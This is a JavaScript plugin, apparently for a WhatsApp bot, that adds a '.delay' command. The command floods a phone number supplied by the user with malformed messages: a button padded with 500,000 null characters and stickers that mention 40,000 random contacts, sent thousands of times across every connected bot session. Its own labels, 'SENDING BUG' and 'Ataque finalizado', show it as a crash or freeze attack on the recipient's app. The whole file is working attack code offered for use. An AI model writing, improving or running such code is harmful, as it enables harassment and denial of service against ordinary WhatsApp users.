
const chalk = require('chalk');
// Ajusta la ruta según donde esté tu CrowSession
const CrowSession = require('../path/to/CrowSession');

const delay = (ms) => new Promise(res => setTimeout(res, ms));
const cooldowns = global.delayCooldowns || new Map();

function dateTime() {
  const now = new Date();
  return now.toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
}

async function safeExec(label, fn) {
  try {
    await fn();
  } catch (err) {
    console.error(`❌ Error en ${label}: ${err.message}`);
  }
}

async function InVisibleX(sock, jid, mention) {
  let msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [{
        buttonId: ".aboutb",
        buttonText: { displayText: "HADES VIP!" + "\u0000".repeat(500000) },
        type: 1,
      }],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid }, content: undefined }],
      }],
    }],
  });

  if (mention) {
    await sock.relayMessage(
      jid,
      { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } },
      { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "hmmm" }, content: undefined }] }
    );
  }
}

async function xatanicaldelayv2(sock, jid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid }, content: undefined }],
      }],
    }],
  });
}

async function sickdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot no activo");

  for (let i = 0; i < 3900; i++) {
    if (!sock.user) break;
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(2000);
  }
}

let handler = async (m, { conn, args }) => {
  const user = m.sender;
  const cooldownTime = 60 * 1000;
  const now = Date.now();
  const lastUse = cooldowns.get(user);

  if (!args[0]) return conn.sendMessage(m.chat, { text: '❗️Ejemplo: .delay 52xxxxxxxxxx' }, { quoted: m });

  if (lastUse && now - lastUse < cooldownTime) {
    const remaining = Math.ceil((cooldownTime - (now - lastUse)) / 1000);
    return conn.sendMessage(m.chat, { text: `⏱️ Espera ${remaining} segundos antes de volver a usarlo.` }, { quoted: m });
  }

  cooldowns.set(user, now);
  global.delayCooldowns = cooldowns;

  const number = args[0].replace(/[^0-9]/g, "");
  const jid = `${number}@s.whatsapp.net`;

  const sessions = CrowSession.sessions;
  if (!sessions || sessions.size === 0) {
    return conn.sendMessage(m.chat, { text: '❌ No hay bots activos para enviar el delay.' }, { quoted: m });
  }

  await conn.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/bbnxok.jpg" },
    caption: `
╭━━━⭓「 SENDING BUG 」
┃ ◇ FECHA : ${dateTime()}
┃ ◇ USUARIO : ${user.split("@")[0]}
┃ ◇ MÉTODO : DELAY
┃ ◇ TARGET : ${number}
╰━━━━━━━━━━━━━━━━━━⭓

🔗 https://wa.me/${number}
    `.trim(),
  }, { quoted: m });

  let success = 0;
  let fail = 0;

  for (const [id, sock] of sessions.entries()) {
    try {
      await sickdelay(sock, jid);
      success++;
    } catch (e) {
      fail++;
    }
  }

  await conn.sendMessage(m.chat, {
    text: `✅ Ataque finalizado\n✔️ Enviados: ${success}\n❌ Fallidos: ${fail}`,
  }, { quoted: m });
};

handler.command = ['delay'];
handler.owner = false;

module.exports = handler;